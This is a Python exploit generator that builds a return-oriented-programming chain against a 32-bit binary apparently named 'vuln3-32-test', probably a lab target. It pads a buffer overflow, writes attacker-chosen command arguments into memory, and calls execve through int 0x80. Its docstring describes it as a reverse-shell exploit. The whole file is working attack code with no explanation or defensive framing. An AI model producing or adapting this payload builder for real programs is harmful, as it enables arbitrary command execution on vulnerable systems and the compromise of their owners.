import input_length
import address_pop
from struct import pack
from get_gadgets import Gadget
import exploit_gadgets
import sys

binary_name = "vuln3-32-test"

gadgets = dict()

def precompute_gadgets(binary_name):
    rop = exploit_gadgets.ROPgadgets(binary_name)
    # Macro definitions for ROP Gadgets
    gadgets['POPEDX']    = Gadget("pop edx",pack('<I', rop.get_gadget("pop edx ; ret"))) # pop edx ; ret
    gadgets['POPEAX']    = Gadget("pop eax",pack('<I', rop.get_gadget("pop eax ; ret"))) # pop eax ; ret
    gadgets['ADDEAXEDX'] = Gadget("add eax edx",pack('<I', rop.get_gadget("add eax, edx ; ret"))) # add eax, edx ; ret

    gadgets['MOVISTACK'] = Gadget("movistack",pack('<I', rop.get_gadget("mov dword ptr [edx], eax ; ret"))) # mov dword ptr [edx], eax ; ret
    gadgets['XOREAX']    = Gadget("zero eax",pack('<I', rop.get_gadget("xor eax, eax ; ret"))) # xor eax, eax ; ret
    gadgets['INCEAX']    = Gadget("inc eax",pack('<I', rop.get_gadget("inc eax ; ret"))) # inc eax ; ret
    gadgets['INCEBX']    = Gadget("inc ebx",pack('<I', rop.get_gadget("inc ebx ; ret"))) # inc ebx ; ret

    gadgets['INCECX']    = Gadget("inc ecx",pack('<I', rop.get_gadget("inc ecx ; ret"))) # inc ecx ; ret
    gadgets['DECEDX']    = Gadget("dec edx",pack('<I', rop.get_gadget("dec edx ; ret"))) # dec edx ; ret
    gadgets['INT80']     = Gadget("int 80",pack('<I', rop.get_gadget("int 0x80 ; ret"))) # int 0x80
    gadgets['NOP']       = Gadget("nop",pack('<I', rop.get_gadget("nop ; ret"))) # nop
    gadgets['POPEBX']    = Gadget("pop ebx",pack('<I', rop.get_gadget("pop ebx ; ret"))) # pop ebx ; ret
    gadgets['POPECXEBX'] = Gadget("pop ecx",pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")),["ebx"]) # pop ecx ; pop ebx ; ret


def preprocess(p):
    """Helper function to preprocess command line arguments w.r.t. /

    :param p: The parameter to be preprocessed
    :return: The preprocessed command line argument
    """
    if '/' in p:
        result = ""
        subargs = p.split('/')
        for subarg in subargs:
            if subarg == ".":
                result += subarg
                continue
            if subarg:
                while len(subarg) < 3:
                    subarg = '/' + subarg
                result += '/' + subarg
        return result
    return p


def create_stack_ropchain(cli_args, base_address):
    """Create the stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The stack ROP chain packed bytes sequence
    """
    p = b''

    offset = 0
    size = len(cli_args)
    for index in range(size):
        if index > 0:
            offset += len(cli_args[index - 1]) + 1
        
        for j in range(len(cli_args[index]) // 4):
            p += address_pop.pop_reg(base_address + offset + j * 4, gadgets['POPEDX'], 0, gadgets['DECEDX'], "dec")[0]

            p += gadgets['POPEAX'].gadget
            p += (cli_args[index][j * 4 : (j + 1) * 4]).encode('utf-8')
            p += gadgets['MOVISTACK'].gadget
        
        p += address_pop.pop_reg(base_address + offset + len(cli_args[index]),gadgets['POPEDX'],0,gadgets['DECEDX'],"dec")[0]

        p += gadgets['XOREAX'].gadget
        p += gadgets['MOVISTACK'].gadget
    
    return p


def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
    """Create the shadow stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :param shadow_stack_offset: The offset used from the .data address to create the shadow stack
    :return: The shadow stack ROP chain packed bytes sequence
    """
    p = b''

    args_offset = 0
    shadow_offset = 0
    size = len(cli_args)
    
    for index in range(size):
        p += address_pop.pop_reg(base_address + args_offset,gadgets['POPEAX'],gadgets['POPEDX'],gadgets['ADDEAXEDX'],"add")[0]
        p += address_pop.pop_reg(base_address + shadow_stack_offset + shadow_offset,gadgets['POPEDX'],0,gadgets['DECEDX'],"dec")[0]
        p += gadgets['MOVISTACK'].gadget

        shadow_offset += 4
        args_offset += len(cli_args[index]) + 1
    
    return p


def rop_exploit(cli_args, base_address):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    (padding, data, bss) = input_length.get_everything(binary_name)
    data += 160 # now contains a null byte
    # print(f"{data:x}")
    STACK     = pack('<I', data)
    exploit = b'\x41' * padding

    exploit += create_stack_ropchain(cli_args,data)
    exploit += address_pop.pop_reg(data,gadgets['POPEBX'],0,gadgets['INCEBX'],"inc")[0]
    exploit += create_shadow_stack_ropchain(cli_args,data,60)
    

    exploit += address_pop.pop_reg(data + 60,gadgets['POPECXEBX'],0,gadgets['INCECX'],"inc")[0]
    exploit += address_pop.pop_reg(data,gadgets['POPEBX'],0,gadgets['INCEBX'],"inc")[0]

    exploit += address_pop.pop_reg(data + 48,gadgets['POPEDX'],0,gadgets['DECEDX'],"dec")[0]

    exploit += gadgets['XOREAX'].gadget # xor eax, eax ; ret
    exploit += gadgets['INCEAX'].gadget * 11 # inc eax ; ret 11 times
    exploit += gadgets['INT80'].gadget # int 0x80
    return exploit


def main():
    if len(sys.argv) != 3:
        print("Error: incorrect number of arguments. \nUse: python3 ropoverflow_execve.py <binary name> <payload name>")
        exit(1)

    precompute_gadgets(sys.argv[1])

    params = input("Enter exploit parameters: ")
    args = []
    for arg in params.split():
        args.append(preprocess(arg))

    print(args)
    fileName=sys.argv[2]
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(args, 0x080da060))
    outfile.close()


if __name__ == "__main__":
    main()